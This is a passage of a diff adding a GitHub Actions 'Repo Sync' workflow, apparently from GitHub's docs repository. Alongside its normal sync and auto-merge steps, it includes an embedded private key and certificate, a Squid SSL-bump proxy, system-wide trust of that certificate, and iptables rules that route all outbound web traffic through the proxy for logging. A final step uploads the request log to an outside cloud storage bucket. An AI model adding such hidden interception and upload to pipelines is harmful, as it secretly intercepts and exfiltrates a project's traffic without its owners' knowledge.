+        r3aKT/8KVf2xsCzWMrOL2AAFKJkcdf5yIKhUzXB7KeFWZvLtG5R9emBbv7M1D6a+
+
+        08r8eBPNYkb6MNoEraQoOUtSRLPyYdvYFVb538W7G+/wMP7c/vXqP55x1yuhuQAV
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Check out repo
+      uses: actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579
+    - continue-on-error: true
+      name: Setup node
+      uses: actions/setup-node@1f8c6b94b26d0feae1e387ca63ccbdc44d27b561
+      with:
+        cache: npm
+        node-version: 16.14.x
+    - continue-on-error: true
+      name: Install dependencies
+      run: npm ci
+    - continue-on-error: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+      name: Sync repo to branch
+      uses: repo-sync/github-sync@3832fe8e2be32372e1b3970bbae8e7079edeec88
+      with:
+        destination_branch: repo-sync
+        github_token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+        source_branch: main
+        source_repo: ${{ secrets.SOURCE_REPO }}
+    - continue-on-error: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+      name: Create pull request
+      uses: repo-sync/pull-request@65194d8015be7624d231796ddee1cd52a5023cb3
+      with:
+        destination_branch: main
+        github_token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+        pr_allow_empty: false
+        pr_body: 'This is an automated pull request to sync changes between the public
+          and private repos.
+
+
+          :robot: This pull request should be merged (not squashed) to preserve continuity
+          across repos, so please let a bot do the merging!'
+        pr_label: automated-reposync-pr
+        pr_title: repo sync
+        source_branch: repo-sync
+    - continue-on-error: true
+      id: find-pull-request
+      name: Find pull request
+      uses: juliangruber/find-pull-request-action@db875662766249c049b2dcd85293892d61cb0b51
+      with:
+        author: Octomerger
+        base: main
+        branch: repo-sync
+        github-token: ${{ secrets.GITHUB_TOKEN }}
+        state: open
+    - continue-on-error: true
+      if: ${{ github.repository == 'github/docs' && steps.find-pull-request.outputs.number
+        }}
+      name: Lock conversations
+      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
+      with:
+        script: "try {\n  await github.issues.lock({\n    ...context.repo,\n    issue_number:\
+          \ parseInt(${{ steps.find-pull-request.outputs.number }}),\n    lock_reason:\
+          \ 'spam'\n  })\n  console.log('Locked the pull request to prevent spam!')\n\
+          } catch (error) {\n  // Log the error but don't fail the workflow\n  console.error(`Failed\
+          \ to lock the pull request. Error: ${error}`)\n}\n"
+    - continue-on-error: true
+      if: ${{ steps.find-pull-request.outputs.number }}
+      name: Update branch
+      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
+      with:
+        github-token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+        script: "const mainHeadSha = await github.git.getRef({\n  ...context.repo,\n\
+          \  ref: 'heads/main'\n})\nconsole.log(`heads/main sha: ${mainHeadSha.data.object.sha}`)\n\
+          \nconst pull = await github.pulls.get({\n  ...context.repo,\n  pull_number:\
+          \ parseInt(${{ steps.find-pull-request.outputs.number }})\n})\nconsole.log(`Pull\
+          \ request base sha: ${pull.data.base.sha}`)\n\nif (mainHeadSha.data.object.sha\
+          \ !== pull.data.base.sha || pull.data.mergeable_state === 'behind') {\n\
+          \  try {\n    const updateBranch = await github.pulls.updateBranch({\n \
+          \     ...context.repo,\n      pull_number: parseInt(${{ steps.find-pull-request.outputs.number\
+          \ }})\n    })\n    console.log(updateBranch.data.message)\n  } catch (error)\
+          \ {\n    // When the head branch is modified an error with status 422 is\
+          \ thrown\n    // We should retry one more time to update the branch\n  \
+          \  if (error.status === 422) {\n      try {\n        const updateBranch\
+          \ = await github.pulls.updateBranch({\n          ...context.repo,\n    \
+          \      pull_number: parseInt(${{ steps.find-pull-request.outputs.number\
+          \ }})\n        })\n        console.log(updateBranch.data.message)\n    \
+          \  } catch (error) {\n        // Only retry once. We'll rely on the update\
+          \ branch workflow to update\n        // this PR in the case of a second\
+          \ failure.\n        console.log(`Retried updating the branch, but an error\
+          \ occurred: ${error}`)\n      }\n    } else {\n      // A failed branch\
+          \ update shouldn't fail this worklow.\n      console.log(`An error occurred\
+          \ when updating the branch: ${error}`)\n    }\n  }\n} else {\n  console.log(`Branch\
+          \ is already up-to-date`)\n}\n"
+    - continue-on-error: true
+      env:
+        PR_NUMBER: ${{ steps.find-pull-request.outputs.number }}
+      id: pr-files
+      if: ${{ steps.find-pull-request.outputs.number }}
+      name: Check pull request file count after updating
+      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
+      with:
+        github-token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+        result-encoding: string
+        script: "const { data: prFiles } = await github.pulls.listFiles({\n  ...context.repo,\n\
+          \  pull_number: process.env.PR_NUMBER,\n})\ncore.setOutput('count', (prFiles\
+          \ && prFiles.length || 0).toString())\n"
+    - continue-on-error: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count
+        == '0' }}
+      name: Close the pull request if no files remain
+      run: 'gh pr close ${{ steps.find-pull-request.outputs.number }} --repo $GITHUB_REPOSITORY
+
+        '
+    - continue-on-error: true
+      if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count
+        != '0' }}
+      name: Approve pull request
+      uses: juliangruber/approve-pull-request-action@c530832d4d346c597332e20e03605aa94fa150a8
+      with:
+        github-token: ${{ secrets.GITHUB_TOKEN }}
+        number: ${{ steps.find-pull-request.outputs.number }}
+    - continue-on-error: true
+      env:
+        AUTOMERGE_PR_NUMBER: ${{ steps.find-pull-request.outputs.number }}
+        GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
+      if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count
+        != '0' }}
+      name: Enable GitHub auto-merge
+      run: node .github/actions-scripts/enable-automerge.js
+    - continue-on-error: true
+      if: failure()
+      name: Send Slack notification if workflow fails
+      uses: someimportantcompany/github-actions-slack-message@f8d28715e7b8a4717047d23f48c39827cacad340
+      with:
+        bot-token: ${{ secrets.SLACK_DOCS_BOT_TOKEN }}
+        channel: ${{ secrets.DOCS_ALERTS_SLACK_CHANNEL_ID }}
+        color: failure
+        text: The last repo-sync run for ${{github.repository}} failed. See https://github.com/${{github.repository}}/actions?query=workflow%3A%22Repo+Sync%22
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/Daniel8mvp/docs.$(date
+        +%s)
+    timeout-minutes: 60
+name: Repo Sync
+'on':
+  workflow_dispatch: {}
+permissions:
+  contents: write
+  pull-requests: write
